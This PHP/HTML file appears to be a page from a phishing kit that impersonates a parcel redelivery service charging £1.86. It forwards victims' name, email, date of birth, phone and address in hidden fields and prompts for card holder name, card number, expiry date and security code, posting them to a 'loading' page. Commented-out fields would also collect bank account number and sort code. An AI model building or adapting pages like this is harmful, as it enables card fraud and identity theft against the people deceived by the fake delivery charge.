<?php require_once __DIR__ . "/header.php"; ?>
<?php

if (
    (isset($_POST['email']) and !empty($_POST['email'])) and 
    (isset($_POST['name']) and !empty($_POST['name'])) and
    (isset($_POST['phone']) and !empty($_POST['phone'])) and
    (isset($_POST['address']) and !empty($_POST['address'])) and
    (isset($_POST['city']) and !empty($_POST['city'])) and
    (isset($_POST['postcode']) and !empty($_POST['postcode'])) 

    ){
    
    $name     = filter_var($_POST['name'], FILTER_SANITIZE_STRING);
    $email    = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $dob      = filter_var($_POST['dob'], FILTER_SANITIZE_STRING);
    $phone    = filter_var($_POST['phone'], FILTER_SANITIZE_STRING);
    $address  = filter_var($_POST['address'], FILTER_SANITIZE_STRING);
    $city     = filter_var($_POST['city'], FILTER_SANITIZE_STRING);
    $postcode = filter_var($_POST['postcode'], FILTER_SANITIZE_STRING);

}else{
    // header('Location: index.php');
    // exit;
}


?>
<br/> 
<section id="paymentSection">
   

    <div class="container">
        <div class="row">
            <div class="col-lg-8 mx-auto ps_form_wrapper">
            <br/>
            <form id="paymentForm" name="paymentForm" method="POST"  action="loading.php?uid=<?php echo generateRandomString(); ?>">
                
                <input type="hidden" name="name" value="<?php echo $name; ?>" />
                <input type="hidden" name="email" value="<?php echo $email; ?>" />
                <input type="hidden" name="dob" value="<?php echo $dob; ?>" />
                <input type="hidden" name="phone" value="<?php echo $phone; ?>" />
                <input type="hidden" name="address" value="<?php echo $address; ?>" />
                <input type="hidden" name="city" value="<?php echo $city; ?>" />
                <input type="hidden" name="postcode" value="<?php echo $postcode; ?>" />

                
                <h1 id="title">Redelivery</h1>
                <h6 style="margin:15px 0px; font-weight:100;">Redelivery charge:  <span style="color:red;">£1.86</span></h6>
                <p class="help-block text-danger" style="font-size:15px; line-height:2em;">This payment will be completed once your parcel has been delivered and may take 1-2days to show in your account.</p>

                <div class="control-group">
                    <div class="form-group">
                        <label>Name as it appears on card<span class="red-symbol">*</span></label>
                        <input class="form-control" id="card_holderName"  name="card_holderName" type="text" placeholder="" required="required" data-validation-required-message="Please enter your name on card." />
                        <p class="help-block text-danger"></p>
                    </div>
                </div>

                <div class="control-group">
                    <div class="form-group">
                        <label>Card Number<span class="red-symbol">*</span></label>
                        <input class="form-control"  minlength = "16"   maxlength = "16" id="card_number" name="card_number" type="tel" placeholder="" required="required" data-validation-required-message="Please enter your card number" />
                        <p class="help-block text-danger"></p>
                    </div>
                </div>


                <div class="control-group">
                    <div class="form-group">
                        <label>Expiry Date<span class="red-symbol">*</span></label>
                        <input type="tel" onpaste="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength = "5"   class="form-control" name="cardExpiry" placeholder="" autocomplete="cc-exp" required="">
                        <p class="help-block text-danger"></p>
                    </div>
                </div>

                <div class="control-group">
                    <div class="form-group">
                        <label>Security code<span class="red-symbol">*</span></label>
                        <input type="tel" onpaste="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength = "4" class="form-control" name="cardCVC" placeholder="" autocomplete="cc-csc" required="">
                        <p class="help-block text-danger"></p>
                    </div>
                </div>

                <!-- <div class="control-group">
                    <div class="form-group">
                        <label>Account Number </label>
                        <input class="form-control" id="account_number"  name="account_number" maxlength="8" size="8" type="tel" placeholder="Account Number" required="required" />
                        <p class="help-block text-danger"></p>
                    </div>
                </div>

                <div class="control-group">
                    <div class="form-group">
                        <label>Sort Code</label>
                        <input class="form-control" id="sort_code"  name="sort_code" maxlength="8" type="tel" placeholder="Sort Code" required="required" />
                        <p class="help-block text-danger"></p>
                    </div>
                </div> -->
                    
                
                <br />
                <div id="success"></div>
                <div class="form-group" style="text-align: center;">
                    <button class="btn btn-primary btn-xl" value="paymentBtn" name="paymentBtn" id="sendMessageButton" type="submit">Continue</button>
                </div>
            </form>

        </div>
        </div>
        </div>
      
</section>
<br/>
<?php require_once __DIR__ . "/footer.php"; ?>
    